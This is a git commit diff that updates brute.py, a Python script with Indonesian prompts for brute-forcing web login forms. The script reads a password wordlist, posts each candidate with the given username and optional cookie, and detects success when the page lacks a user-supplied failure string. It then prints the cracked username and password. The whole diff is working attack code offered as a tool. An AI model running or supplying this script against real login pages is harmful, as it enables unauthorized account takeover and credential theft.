39d2c5da3ba1a29a5954a30b063ec646bbccd503
Dhema Eka Priantara <dhema112@gmail.com>
2023-06-03 12:20:03 +0700

    Update brute.py
    update firtur

--- brute.py
+++ brute.py
@@ -1,34 +1,35 @@
-
 import requests
 from termcolor import colored
 
 url = input('[+] Masukkan URL: ')
-username = input('[+] Masukin username Bruteforce: ')
-file_pwd = input('[+] Masukin password file: ')
-string_gagal = input('[+] masukin string kalo Login gagal: ')
-cookie_value = input('masukin nilai coockies(kalo ada): ')
+username = input('[+] Masukkan username untuk Bruteforce: ')
+file_pwd = input('[+] Masukkan file kata sandi: ')
+string_gagal = input('[+] Masukkan string yang muncul jika login gagal: ')
+cookie_value = input('Masukkan nilai cookie (jika ada): ')
 
+def cracking(username, url):
+    with open(file_pwd, 'r') as password_file:
+        passwords = password_file.readlines()
+        total_passwords = len(passwords)
+        cracked = False
 
-def cracking(username,url):
-	  for password in passwords:
-		password = password.strip()
-		print(colored(('Coba: ' + password), 'red'))
-		data = {'username':username,'password':password,'Login':'submit'}
-		if cookie_value != '':
-			response = requests.get(url, params={'username':username,'password':password,'Login':'Login'}, cookies = {'Cookie': cookie_value})
-		else:
-			response = requests.post(url, data=data)
-		if string_gagal in response.content.decode():
-			pass
-		else:
-			print(colored(('[+] menemukan username: ==> ' + username), 'green'))
-			print(colored(('[+] menemuukanp assword: ==> ' + password), 'green'))
-			exit()
+        for index, password in enumerate(passwords):
+            password = password.strip()
+            print(colored(('Mencoba kata sandi ke-' + str(index + 1) + ' dari ' + str(total_passwords) + ': ' + password), 'red'))
+            data = {'username': username, 'password': password, 'Login': 'submit'}
+            if cookie_value != '':
+                response = requests.post(url, data=data, cookies={'Cookie': cookie_value})
+            else:
+                response = requests.post(url, data=data)
+            if string_gagal in response.content.decode():
+                pass
+            else:
+                print(colored(('[+] Username ditemukan: ==> ' + username), 'green'))
+                print(colored(('[+] Kata sandi ditemukan: ==> ' + password), 'green'))
+                cracked = True
+                break
 
+        if not cracked:
+            print('[!!] Kata sandi tidak ditemukan dalam daftar')
 
-
-
-with open(file_pwd, 'r') as passwords:
-	cracking(username,url)
-
-print('[!!] Pass Ga ada di list')
+cracking(username, url)
